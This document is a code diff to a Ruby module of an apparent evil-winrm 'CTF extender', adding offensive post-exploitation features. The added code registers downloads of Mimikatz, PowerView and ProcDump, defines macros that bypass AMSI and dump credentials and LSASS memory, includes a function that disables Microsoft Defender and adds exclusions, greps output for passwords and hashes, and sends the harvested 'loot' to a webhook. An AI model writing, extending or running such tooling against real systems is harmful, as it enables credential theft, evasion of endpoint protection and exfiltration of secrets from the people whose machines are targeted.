@@ -1,5 +1,3 @@
-# evil-winrm-ctf-extender/lib/evil_ctf/tools.rb
-
 require 'fileutils'
 require 'zip'
 require 'uri'
@@ -12,7 +10,33 @@ require 'shellwords'
 
 module EvilCTF::Tools
   TOOL_REGISTRY = {
-    # ... (same as original registry, truncated for brevity)
+    mimikatz: { 
+      name: "Mimikatz", 
+      filename: "mimikatz.exe",
+      description: "Extract credentials from memory",
+      category: "credential_tools",
+      download_url: "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220910/mimikatz_trunk.7z",
+      backup_urls: [],
+      recommended_remote: "C:\\Users\\Public\\mimikatz.exe"
+    },
+    powerview: {
+      name: "PowerView", 
+      filename: "PowerView.ps1",
+      description: "Active Directory enumeration toolkit",
+      category: "reconnaissance",
+      download_url: "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1",
+      backup_urls: [],
+      recommended_remote: "C:\\Users\\Public\\PowerView.ps1"
+    },
+    procdump: {
+      name: "ProcDump", 
+      filename: "procdump64.exe",
+      description: "Sysinternals process dumper for LSASS extraction",
+      category: "memory_tools",
+      download_url: "https://download.sysinternals.com/files/Procdump.zip",
+      backup_urls: [],
+      recommended_remote: "C:\\Users\\Public\\procdump64.exe"
+    }
   }.freeze
 
   # AMSI bypass script
@@ -71,7 +95,15 @@ module EvilCTF::Tools
       @aliases = { 'ls'=>'Get-ChildItem', 'whoami'=>'$env:USERNAME', 'pwd'=>'Get-Location', 'ps'=>'Get-Process' }
       @macros = {
         'kerberoast'     => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" kerberoast /outfile:C:\\Users\\Public\\hashes.txt 2>$null'],
-        # ... (rest of macros)
+        'dump_creds'     => [
+          BYPASS_4MSI_PS,
+          "& \"C:\\Users\\Public\\mimikatz.exe\" \"privilege::debug\" \"log C:\\Users\\Public\\mimikatz.log\" \"sekurlsa::logonpasswords\" 2>$null"
+        ],
+        'lsass_dump'     => [
+          BYPASS_4MSI_PS,
+          "& \"C:\\Users\\Public\\procdump64.exe\" -accepteula -ma lsass C:\\Users\\Public\\lsass.dmp",
+          "Remove-Item \"C:\\Users\\Public\\procdump64.exe\""
+        ]
       }
     end
 
@@ -171,7 +203,6 @@ module EvilCTF::Tools
 
     arch = get_system_architecture(shell)
     adjusted_tool = tool.dup
-    # architecture-specific adjustments omitted for brevity
 
     local_path = find_tool_on_disk(tool_key)
     unless local_path && File.exist?(local_path)
@@ -181,7 +212,7 @@ module EvilCTF::Tools
     end
 
     puts "[*] Staging #{adjusted_tool[:name]} to #{remote_path}"
-    upload_file(local_path, remote_path, shell)
+    EvilCTF::Uploader.upload_file(local_path, remote_path, shell)
   rescue => e
     puts "[!] Auto staging failed: #{e.message}"
     false
@@ -204,9 +235,147 @@ module EvilCTF::Tools
     puts '=' * 70
   end
 
-  # Helper functions for loot handling (simplified)
-  def self.grep_output(output); [] end # placeholder
-  def self.save_loot(matches); end # placeholder
-  def self.beacon_loot(webhook, matches); end # placeholder
-end
+  def self.disable_defender(shell)
+    ps_script = <<~PS
+      try {
+        Set-MpPreference -DisableRealtimeMonitoring $true -Force
+        Add-MpPreference -ExclusionPath "C:\\Users\\Public" -Force
+        Add-MpPreference -ExclusionProcess "mimikatz.exe", "procdump64.exe" -Force
+        Write-Output "Defender real-time monitoring disabled"
+      } catch {
+        Write-Output "ERROR: Defender disable failed"
+      }
+    PS
 
+    result = shell.run(ps_script)
+    puts result.output.strip
+  end
+
+  # Additional helper methods that were missing
+  def self.get_system_architecture(shell)
+    arch_result = shell.run('$env:PROCESSOR_ARCHITECTURE')
+    arch = arch_result.output.strip.downcase
+    case arch
+    when 'amd64', 'x86_64'
+      'x64'
+    else
+      'x86'
+    end
+  rescue => e
+    puts "[!] Failed to detect architecture, assuming x64"
+    'x64'
+  end
+
+  def self.find_tool_on_disk(tool_key)
+    tool = TOOL_REGISTRY[tool_key]
+    return nil unless tool
+    
+    local_path = File.join('tools', tool[:filename])
+    File.exist?(local_path) ? local_path : nil
+  rescue => e
+    puts "[!] Error finding tool on disk: #{e.message}"
+    nil
+  end
+
+  # Helper functions for loot handling (simplified but functional)
+  def self.grep_output(output)
+    return [] unless output
+    
+    matches = []
+    patterns = [
+      /password[:\s]+([^\r\n]+)/i,
+      /hash[:\s]+([a-f0-9]{32,})/i,
+      /flag\{[^}]+\}/i
+    ]
+    
+    patterns.each do |pattern|
+      output.scan(pattern) { |match| matches << match.first }
+    end
+    
+    matches.compact.uniq
+  rescue => e
+    puts "[!] Error grepping output: #{e.message}"
+    []
+  end
+
+  def self.save_loot(matches)
+    return unless matches.any?
+    
+    FileUtils.mkdir_p('loot')
+    timestamp = Time.now.strftime('%Y%m%d_%H%M%S')
+    loot_file = "loot/auto_loot_#{timestamp}.txt"
+    
+    File.open(loot_file, 'a') do |f|
+      matches.each { |match| f.puts "[*] #{Time.now}: #{match}" }
+    end
+    
+    puts "[+] Loot saved to #{loot_file}"
+  rescue => e
+    puts "[!] Failed to save loot: #{e.message}"
+  end
+
+  def self.beacon_loot(webhook, matches)
+    return unless webhook && matches.any?
+    
+    # Basic webhook beacon for loot
+    payload = {
+      timestamp: Time.now.iso8601,
+      loot: matches.join(', '),
+      count: matches.length
+    }.to_json
+    
+    begin
+      uri = URI.parse(webhook)
+      http = Net::HTTP.new(uri.host, uri.port)
+      http.use_ssl = (uri.scheme == 'https')
+      
+      request = Net::HTTP::Post.new(uri.request_uri)
+      request['Content-Type'] = 'application/json'
+      request.body = payload
+      
+      response = http.request(request)
+      puts "[+] Beacon sent to #{webhook}: HTTP #{response.code}"
+    rescue => e
+      puts "[!] Failed to beacon loot: #{e.message}"
+    end
+  rescue => e
+    puts "[!] Webhook error: #{e.message}"
+  end
+
+  # Profile management methods
+  def self.save_config_profile(name, options)
+    profile = {
+      name: name,
+      options: options.except(:endpoint),
+      timestamp: Time.now.iso8601
+    }
+    
+    config_dir = File.join('config', 'profiles')
+    FileUtils.mkdir_p(config_dir)
+    
+    profile_file = File.join(config_dir, "#{name}.yaml")
+    require 'yaml'
+    File.write(profile_file, YAML.dump(profile))
+    
+    puts "[+] Profile saved: #{profile_file}"
+  rescue => e
+    puts "[!] Failed to save profile: #{e.message}"
+  end
+
+  def self.load_config_profile(name)
+    config_dir = File.join('config', 'profiles')
+    profile_file = File.join(config_dir, "#{name}.yaml")
+    
+    unless File.exist?(profile_file)
+      puts "[!] Profile not found: #{profile_file}"
+      return {}
+    end
+    
+    require 'yaml'
+    profile_data = YAML.load_file(profile_file)
+    profile_data[:options] || {}
+  rescue => e
+    puts "[!] Failed to load profile: #{e.message}"
+    {}
+  end
+end
